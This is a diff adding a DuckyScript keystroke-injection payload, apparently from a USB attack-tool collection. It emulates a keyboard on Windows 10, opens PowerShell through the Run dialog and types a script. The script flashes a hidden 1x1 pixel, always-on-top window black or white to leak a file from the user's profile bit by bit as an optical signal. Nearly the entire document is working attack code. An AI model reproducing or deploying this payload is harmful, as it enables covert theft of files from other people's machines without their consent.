@@ -1,0 +1,104 @@
+REM Title: PixelReflection
+REM Author: Cribbit
+REM Description: Creates a form and changes the background to black or white to represent the bits of a file.
+REM Target: Windows 10
+
+ATTACKMODE HID
+REM Frames per secound
+DEFINE #FPS 60
+REM form position
+DEFINE #TOP 0
+DEFINE #LEFT 0
+REM form size 1x1 px
+DEFINE #HEIGHT 1
+DEFINE #WIDTH 1
+REM File to send (suggest a small file)
+DEFINE #FILE $env:USERPROFILE\test.jpg
+
+EXTENSION DETECT_READY
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        USAGE:
+            Extension runs inline (here)
+            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+            boot delay
+
+        TARGETS:
+            Any system that reflects CAPSLOCK will detect minimum required delay
+            Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
+    END_REM
+
+    REM CONFIGURATION:
+    DEFINE #RESPONSE_DELAY 25
+    DEFINE #ITERATION_LIMIT 120
+
+    VAR $C = 0
+    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
+        CAPSLOCK
+        DELAY #RESPONSE_DELAY
+        $C = ($C + 1)
+    END_WHILE
+    CAPSLOCK
+END_EXTENSION
+
+
+DELAY 2000
+GUI r
+DELAY 200
+STRINGLN powershell
+DELAY 500
+STRINGLN_POWERSHELL
+    <# Load .Net forms assembly #> `
+    [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms");`
+    Add-Type -Assembly PresentationFramework;`
+    <# Set up speed / sleep time in mills #> `
+    $fps = #FPS;`
+    $mills = 1000/$fps;`
+    <# set the xml for the WPF form #> `
+    [xml]$xaml = @"
+    <Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+    Width="#WIDTH" Height="#HEIGHT" Left="#LEFT" Top="#TOP"
+    WindowStyle="None" Background="Red" Topmost="True" ShowInTaskbar="False" ResizeMode="NoResize"/>
+    "@;`
+    <# Read the xml #> `
+    $reader = (New-Object System.Xml.XmlNodeReader $xaml);`
+    <# Create the windows form #> `
+    $window = [Windows.Markup.XamlReader]::Load($reader);`
+    <# Create a timer that will run when the form is shown #> `
+    $timer = New-Object System.Windows.Forms.Timer;`
+    $timer.Interval = 5;`
+    Function Timer_Tick()
+    {
+        $timer.Stop();
+        Start-Sleep -Milliseconds $mills;
+        <#  Get the content of the file encoded as bytes
+            for each byte step though 7 to 0
+            shift left 1 by n (7to0) see if this bit is set in the byte
+            if true set the background to white else to black
+        #>
+        Get-Content #FILE -En By | % {
+            $b=$_;7..0 | % {
+                if($b-band(1-shl$_))
+                {
+                    $window.Background = "White";
+                }
+                else
+                {
+                    $window.Background = "Black";
+                }
+                $window.Dispatcher.Invoke([action]{}, "Render");
+                Start-Sleep -Milliseconds $mills;
+            }
+        };
+        $window.Background = "Green";
+        $window.Dispatcher.Invoke([action]{}, "Render");
+        Start-Sleep -Milliseconds $mills;
+        $window.Close();
+    };`
+    $window.Add_Loaded({$timer.Start()});`
+    $timer.Add_Tick({Timer_Tick});`
+    <# Show the wpf window as a dialog so it is blocking #> `
+    [void]$window.ShowDialog();
+END_STRINGLN
